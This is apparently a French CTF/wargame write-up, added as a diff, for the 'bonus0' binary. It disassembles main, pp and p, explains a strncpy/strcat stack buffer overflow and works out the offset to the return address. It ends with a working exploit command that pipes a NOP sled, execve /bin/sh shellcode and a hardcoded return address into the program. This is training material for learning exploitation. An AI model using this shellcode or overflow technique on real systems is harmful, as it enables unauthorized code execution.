@@ -1,0 +1,181 @@
+On observe que le main appelle la fonction pp qui appellera deux fois la fonction p avec deux appels à read de l'entrée standard
+
+Le read stocke l'entrée standard dans un buffer de 4096 chars et copie les 20 premiers chars dans une chaine.
+
+1er read : 20 chars copiés dans chaine1
+2ème read : 20 chars copiés dans chaine2
+
+
+Ensuite : 
+1er cas : len(chaine1) < 20 => chaine1 et chaine 2 concaténée avec ' ' au milieu
+2ème cas : len (chaine1) > 20 => chaine1 et chaine 2 concaténée  puis ' ' puis chaine2
+
+=> le strlen cherche le '\0' qu'il ne trouve pas car dans la fonction 'p' le '\0' est placé à la place du '\n' (qu'il ne trouve pas car n'a pas été copié dans les 20 premiers char)
+=> donc le second p place str2 après les 20 premiers chars de str1 (car les adresses se suivent)
+
+=> ensuite on copy str dans buff (potentiellement str1+str2)
+=> on calcule la longueur de cette chaine et on ajoute ' ' + '\0' et enfin on ajoute str2
+=> on a donc str1+str2+' '+str2 copié dans le buffer de 42 chars du main
+
+
+0xbffff6e0        <-72> esp main top
+                |
+                |    {zone des paramettres des fonction appelés}
+                |
+                |    <-50> {str}
+                |    |
+                |    | {42 octet}
+                |    v
+                |    <-8> {alignement}
+0xbffff728        <0> ebp __main_bottom
+                <+4> eip
+                <+8> {argc}
+                <+12> {argv}
+                <+16> {env}
+
+
+Donc il nous faut 42 chars + 8 chars (alignement) + 4 chars (ebp) + adresse => 54 chars + adresse
+
+Approximativement : 
+   Input1 : A*20 + x90 + shellcode (buffer de plus de 4000 chars)
+   Input2 : B*x + adresse shellcode
+
+après le strcpy on aura donc 20 chars copiés du 1er read + 19 chars du second read (B*14 + 4 adresses + 1 char) => x*20 + y*14 + XXXX + y
+on ajoute un ' ' (40 chars) =>  x*20 + y*14 + XXXX + y + ' '
+après le strcat (a + b = 40 chars + 19 = 59 chars)  =>  x*20 + y*14 + XXXX + y + ' ' + y*14 + XXXX + y
+
+
+
+1er read on peut ajouter 2000 \x90 (moitié du buffer) et viser l'adresse du buffer + 1000 => 0xbfffe680 + 1000 = 0xbfffe680 + 0x3e8 = 0xBFFFEA68
+
+
+Pour être large et moins calculer l'adresse du shellcode : 
+
+(python -c "print('A' * 20 + '\x90' * 2000 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"; python -c "print('B' * 14 + '\xbf\xff\xea\x68'[::-1] + 'B')"; cat) | ./bonus0
+
+
+i functions : 
+
+0x080484b4  p
+0x0804851e  pp
+0x080485a4  main
+
+
+
+Dump of assembler code for function main:
+   0x080485a4 <+0>:     push   ebp
+   0x080485a5 <+1>:     mov    ebp,esp
+   0x080485a7 <+3>:     and    esp,0xfffffff0
+   0x080485aa <+6>:     sub    esp,0x40
+   0x080485ad <+9>:     lea    eax,[esp+0x16]
+   0x080485b1 <+13>:    mov    DWORD PTR [esp],eax
+   0x080485b4 <+16>:    call   0x804851e <pp> => call pp avec esp (0xbffff6f6 char *?)
+   0x080485b9 <+21>:    lea    eax,[esp+0x16] => eax = "abcdefgh 123456"
+   0x080485bd <+25>:    mov    DWORD PTR [esp],eax
+   0x080485c0 <+28>:    call   0x80483b0 <puts@plt> => puts("abcdefgh 123456")
+   0x080485c5 <+33>:    mov    eax,0x0
+   0x080485ca <+38>:    leave
+   0x080485cb <+39>:    ret
+End of assembler dump.
+
+
+
+
+Dump of assembler code for function pp:                         
+   0x0804851e <+0>:     push   ebp                              
+   0x0804851f <+1>:     mov    ebp,esp                          
+   0x08048521 <+3>:     push   edi                              
+   0x08048522 <+4>:     push   ebx                              
+   0x08048523 <+5>:     sub    esp,0x50                         
+   0x08048526 <+8>:     mov    DWORD PTR [esp+0x4],0x80486a0    => 0x80486a0 = " - "
+   0x0804852e <+16>:    lea    eax,[ebp-0x30]        => ebp-0x30 : 0xbffff6a8:     0x00000000  donc eax = 0xbffff6a8 : 0         
+   0x08048531 <+19>:    mov    DWORD PTR [esp],eax             
+   0x08048534 <+22>:    call   0x80484b4 <p>            => call p 
+
+   0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0    
+   0x08048541 <+35>:    lea    eax,[ebp-0x1c]                   
+   0x08048544 <+38>:    mov    DWORD PTR [esp],eax              
+   0x08048547 <+41>:    call   0x80484b4 <p>     
+
+   0x0804854c <+46>:    lea    eax,[ebp-0x30]  => "abcdefghijklmnopqrst123456789123456789"    
+   0x0804854f <+49>:    mov    DWORD PTR [esp+0x4],eax          
+   0x08048553 <+53>:    mov    eax,DWORD PTR [ebp+0x8]          
+   0x08048556 <+56>:    mov    DWORD PTR [esp],eax              
+   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>  strcpy(dst, src) => strcpy(0xbffff6f6, "abcdefghijklmnopqrst123456789123456789")
+
+   0x0804855e <+64>:    mov    ebx,0x80486a4  => 0x80486a4:      0x00000020 (= " ")                  
+   0x08048563 <+69>:    mov    eax,DWORD PTR [ebp+0x8]  => eax = "abcdefghijklmnopqrst123456789123456789"
+   0x08048566 <+72>:    mov    DWORD PTR [ebp-0x3c],0xffffffff  
+   0x0804856d <+79>:    mov    edx,eax  => edx = "abcdefghijklmnopqrst123456789123456789"                        
+   0x0804856f <+81>:    mov    eax,0x0    => eax = 0                      
+   0x08048574 <+86>:    mov    ecx,DWORD PTR [ebp-0x3c]    => ecx =   0xffffffff   
+   0x08048577 <+89>:    mov    edi,edx  => edi =   "abcdefghijklmnopqrst123456789123456789..."  
+
+   0x08048579 <+91>:    repnz scas al,BYTE PTR es:[edi]   => tant que str[i] != '\0' => i++ => strlen 
+
+
+   Tentative avec "abcdefgh" et "123456"
+
+
+   0x0804857b <+93>:    mov    eax,ecx   => ecx = 0xfffffff6            
+   0x0804857d <+95>:    not    eax     => eax = 0x9         (len de str1 copiée dans buffer)                
+   0x0804857f <+97>:    sub    eax,0x1   => eax = 8         (lenght de str1 - '\n')              
+   0x08048582 <+100>:   add    eax,DWORD PTR [ebp+0x8] // ebp+8 = 0xbffff706:      "abcdefgh"  ==> eax = 0xbffff70e:     0xffff0800    
+   0x08048585 <+103>:   movzx  edx,WORD PTR [ebx]    => ebx = 0x20 (' ') => edx = 0x20           
+   0x08048588 <+106>:   mov    WORD PTR [eax],dx   => eax = 0xffff0020 => eax = " "      
+   0x0804858b <+109>:   lea    eax,[ebp-0x1c] // ebp-0x1c = 123456 => eax =  0xbffff6cc: "123456"                 
+   0x0804858e <+112>:   mov    DWORD PTR [esp+0x4],eax          
+   0x08048592 <+116>:   mov    eax,DWORD PTR [ebp+0x8]  => "123456"     
+   0x08048595 <+119>:   mov    DWORD PTR [esp],eax    => "abcdefgh "
+
+   0x08048598 <+122>:   call   0x8048390 <strcat@plt>   strcat(dst, src) => strcat("abcdefgh ", "123456")       => eax =  "abcdefgh 123456"
+   0x0804859d <+127>:   add    esp,0x50   =>  esp= 0xb7fd0ff4                      
+   0x080485a0 <+130>:   pop    ebx                              
+   0x080485a1 <+131>:   pop    edi                              
+   0x080485a2 <+132>:   pop    ebp            
+
+   0x080485a3 <+133>:   ret                                     
+End of assembler dump.                                          
+
+
+
+
+Dump of assembler code for function p:
+   0x080484b4 <+0>:     push   ebp
+   0x080484b5 <+1>:     mov    ebp,esp
+   0x080484b7 <+3>:     sub    esp,0x1018
+   0x080484bd <+9>:     mov    eax,DWORD PTR [ebp+0xc] => ebp+0xc = 0x080486a0 (' - ')
+   0x080484c0 <+12>:    mov    DWORD PTR [esp],eax
+   0x080484c3 <+15>:    call   0x80483b0 <puts@plt> => impression de ' - '
+
+   0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000
+   0x080484d0 <+28>:    lea    eax,[ebp-0x1008] => 0xbfffe678:     0x00000000
+   0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax => 0xbfffe670 :  0
+   0x080484da <+38>:    mov    DWORD PTR [esp],0x0 => 0
+   0x080484e1 <+45>:    call   0x8048380 <read@plt> => read (0, buff, 4096) => 0xbfffe670:      "abcdefghijklmnopqrstuvwxyz\n" et $eax = 1b (strlen dont '\n')
+
+   0x080484e6 <+50>:    mov    DWORD PTR [esp+0x4],0xa
+   0x080484ee <+58>:    lea    eax,[ebp-0x1008] => 0xbffff288:     0x00000044
+   0x080484f4 <+64>:    mov    DWORD PTR [esp],eax => eax = 0xbfffe670: "abcdefghijklmnopqrstuvwxyz\n"
+   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt> => on recherche si char '\n' est dans "abcdefghijklmnopqrstuvwxyz\n"
+
+   0x080484fc <+72>:    mov    BYTE PTR [eax],0x0 => eax[0] = 0 ?
+   0x080484ff <+75>:    lea    eax,[ebp-0x1008] => 0xbfffe670 : "abcdefghijklmnopqrstuvwxyz\n"
+   0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14 => 20
+   0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax => "abcdefghijklmnopqrstuvwxyz\n"
+   0x08048511 <+93>:    mov    eax,DWORD PTR [ebp+0x8] =>0xbffff680:  0xbffff6a8 = ""
+   0x08048514 <+96>:    mov    DWORD PTR [esp],eax => 0xbffff6a8 (dst = "")
+   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt> strncpy(dest, src, size) => strncpy(0xbffff6a8, "abc", 20)
+
+=> 0xbffff6a8:    "abcdefghijklmnopqrst...." (20 chars copiés plus divers après car pas de '\0')
+
+
+Au deuxième tour : (chaine = "123456789123456789")
+strncpy(0xbffff6cc, "123456789123456789" (src = 0xbfffe670), 20)
+
+
+0xbffff6a8:      "abcdefghijklmnopqrst123456789123456789"
+
+   0x0804851c <+104>:   leave
+   0x0804851d <+105>:   ret
+End of assembler dump.
